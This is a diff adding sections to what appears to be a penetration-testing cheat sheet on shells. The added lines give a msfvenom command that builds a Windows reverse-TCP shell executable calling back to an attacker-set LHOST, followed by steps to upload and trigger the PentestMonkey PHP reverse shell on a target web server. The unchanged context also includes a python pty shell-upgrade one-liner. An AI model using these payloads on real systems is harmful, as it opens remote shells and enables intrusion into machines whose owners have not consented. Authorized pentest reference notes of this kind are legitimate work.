@@ -34,6 +34,26 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 This creates a pseudo-terminal; it does not configure the operator's terminal. [Python pty](https://docs.python.org/3/library/pty.html).
 
+## Windows reverse payload
+
+Generate an exe for a Windows target; match the payload architecture to the target:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o reverse.exe
+```
+
+Start the [listener](shells/shells#listeners) first, then transfer and run the exe. [Metasploit msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).
+
+## PHP reverse shell
+
+When the target serves PHP (WAMP, XAMPP), copy the bundled shell, set its address values inside the file, upload it to a served directory, then browse to it:
+
+```bash
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+```
+
+TODO: verify the packaged path and the PHP version the target runs. [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell).
+
 ## Shell connection failure
 
 - [ ] Confirm [listener](shells/shells#listeners), reachable LHOST and matching LPORT.
